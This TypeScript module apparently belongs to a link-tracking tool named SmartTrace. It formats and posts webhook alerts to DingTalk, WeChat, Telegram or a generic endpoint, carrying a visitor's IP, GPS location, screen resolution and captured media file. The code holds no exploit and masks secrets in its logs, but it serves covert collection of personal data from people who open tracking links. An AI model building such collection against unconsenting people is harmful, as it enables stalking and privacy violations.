import axios from "axios";
import { getSmtpSetting } from "./db";
import { isHighRisk } from "./risk";

function maskWebhookUrl(value: string): string {
  try {
    const url = new URL(value);
    for (const key of ["access_token", "token", "key", "secret", "api_key"]) {
      if (url.searchParams.has(key)) url.searchParams.set(key, "***");
    }
    return url.toString();
  } catch {
    return "[invalid webhook url]";
  }
}

function sanitizeError(error: unknown): string {
  const message = error instanceof Error ? error.message : String(error);
  return message.replace(/(token|secret|key|password|api[_-]?key)=([^&\s]+)/gi, "$1=***").slice(0, 300);
}

export async function sendWebhookNotification(data: {
  linkId: string;
  ip: string;
  gps: string;
  resolution: string;
  filePath: string;
  createdAt: Date;
  userId?: number | null;
  riskFlags?: string;
  collectionMode?: string;
}) {
  if (!data.userId) return;
  const setting = await getSmtpSetting(data.userId);
  if (!setting || !setting.webhookUrl) return;

  const { webhookUrl, webhookType, webhookTemplate, webhookAlertLevel } = setting;

  if (webhookAlertLevel === "high" && !isHighRisk(data.riskFlags?.split(","))) {
    return;
  }
  
  let text = webhookTemplate || `🚨 [SmartTrace 访客提醒]
- 追踪编号: {linkId}
- IP 地址: {ip}
- GPS 定位: {gps}
- 屏幕分辨率: {resolution}
- 捕获时间: {createdAt}
- 媒体文件: {filePath}
- 采集模式: {collectionMode}
- 风险标记: {riskFlags}`;

  text = text
    .replace(/{linkId}/g, data.linkId)
    .replace(/{ip}/g, data.ip)
    .replace(/{gps}/g, data.gps)
    .replace(/{resolution}/g, data.resolution)
    .replace(/{createdAt}/g, new Date(data.createdAt).toLocaleString())
    .replace(/{filePath}/g, data.filePath)
    .replace(/{collectionMode}/g, data.collectionMode || "media")
    .replace(/{riskFlags}/g, data.riskFlags || "none");

  try {
    if (webhookType === "dingtalk") {
      await axios.post(webhookUrl, {
        msgtype: "text",
        text: { content: text },
      }, { timeout: 5000 });
    } else if (webhookType === "wechat") {
      await axios.post(webhookUrl, {
        msgtype: "text",
        text: { content: text },
      }, { timeout: 5000 });
    } else if (webhookType === "telegram") {
      const targetUrl = webhookUrl.includes("?") ? `${webhookUrl}&text=${encodeURIComponent(text)}` : `${webhookUrl}?text=${encodeURIComponent(text)}`;
      await axios.get(targetUrl, { timeout: 5000 });
    } else {
      await axios.post(webhookUrl, { content: text }, { timeout: 5000 });
    }
    console.log(JSON.stringify({ event: "webhook.sent", type: webhookType, endpoint: maskWebhookUrl(webhookUrl), riskFlags: data.riskFlags || "none" }));
  } catch (error) {
    console.error(JSON.stringify({ event: "webhook.failed", type: webhookType, endpoint: maskWebhookUrl(webhookUrl), error: sanitizeError(error) }));
  }
}
